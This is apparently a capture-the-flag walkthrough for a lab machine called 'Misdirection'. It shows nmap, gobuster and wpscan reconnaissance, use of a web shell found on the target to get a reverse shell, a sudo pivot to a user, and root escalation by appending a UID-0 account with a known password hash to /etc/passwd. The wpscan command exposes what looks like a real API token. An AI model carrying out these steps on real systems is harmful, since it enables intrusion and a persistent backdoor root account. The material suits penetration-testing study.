# MISDIRECTION: 1

# 1 Information gathering
## 1.1 Discovery host
`nmap -Pn -F 192.168.122.1/24 -oN host_discovery.txt`

![964ae28c347ea800c0ca3cb1af9404fc.png](./_resources/f8184439c1bc485198e1fbabbc256194.png)


## 1.2 Service enum
`nmap -sV -sC -p- 192.168.122.128 -oN full_service_enum-sC.txt`
![c0118f47fe3f23543752037d1cd3819a.png](./_resources/4482c4bf993e417685148f57d11af681.png)

`nmap -sV -sU -F 192.168.128.128 -oN udp-sC-sV.txt`

## 1.3 Web 80
### 1.3.1 Gobuster
`gobuster dir -u http://192.168.122.128 -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt --wildcard -o info.txt`

`gobuster dir -u http://192.168.122.128 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt --wildcard -o info1.txt`

You will need grep data that not contain 400 status code:

![57f359a1ac8c6bb2a67ff4619507d0be.png](./_resources/cf75231c96414c28b812d0e075b996fa.png)

### 1.3.2 User manual in main page
`http://192.168.122.128/init/static/evote_user_manual.pdf`

  It shows us the app version:
![e0e864b44d766ba704d46023ccf3cbee.png](./_resources/898f5658981f44ad835074360dc57734.png)

### 3.3.3 Web2py exploit (but not usable)
![1c2993967314b90787c70b7e71328f70.png](./_resources/db6e6e2312d44a9bb5285d93f093f2e3.png)

## 1.4 Web 8080
### 1.4.1 Dirb
![8d73d362506f8d8a4312bbd596efd2a3.png](./_resources/e1b093ad4cea4cd0b9eef71ba3285f35.png)

Interesting, the target have wordpress, debug and shell directories.

### 1.4.2 Wpscan
`wpscan --url http://192.168.122.128:8080/wordpress/ -e ap,at,tt,cb,dbe,u1-20,m --plugins-detection aggressive --disable-tls-checks --api-token 7MBL9noH6s6pOW5qAM6boXVS5wEMayvrBaaoBbMaIKg -o all-info.txt`

### 1.4.3 Debug dir (web shell)
![b83066b3a593994bb2a59b4bf2fea860.png](./_resources/7b7b9241d3f5418ba9fbc2194d746a33.png)
Here we have a web shell previously uploaded by an attacker. I will use it.


# 2 Exploitation
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
For reverse shell we can use the web shell:

![ff339e186917b0d67b44f0eccb33c84a.png](./_resources/30d8685843284d37ad9ed3289aa98dbb.png)


# 3 Post-exploitation
LinEnum returns some information:
![794419220afc11924c878cccbaad64b2.png](./_resources/4f318c4c53854d73ac64ab2049a9b0fa.png)
![bcabaf737f7668b53158a3050497cad8.png](./_resources/182c1ba93b234e8698ff7261c793c224.png)

## 3.1 First user
`sudo -u brexit /bin/bash`

![928841574ea280986c8302033b2610e6.png](./_resources/dbdf0674767b42d2be38840ba5075579.png)

## 3.2 Getting root with openssl
Since we have write access as brexit user, we can use openssl to escalate privilege:
`openssl passwd -1 -salt foo foo@12345`
![2016a7f9e96d0bba799880d83c8b9a24.png](./_resources/80bcb574c6ff4cad840f3f9e52854a92.png)

With `echo`, let's add a new user manually:
`echo 'foo:$1$foo$vIxZ6xcPqixL6sHxOWInM1:0:0:root:/root:/bin/bash' >> /etc/passwd`

obs: Its necessary to use single quotes, or the new user is not added.

![c822d5c8d2b6c604aa7e0bfa3ca82185.png](./_resources/483d8f387d9f4c9c90c9eed9ec538208.png)
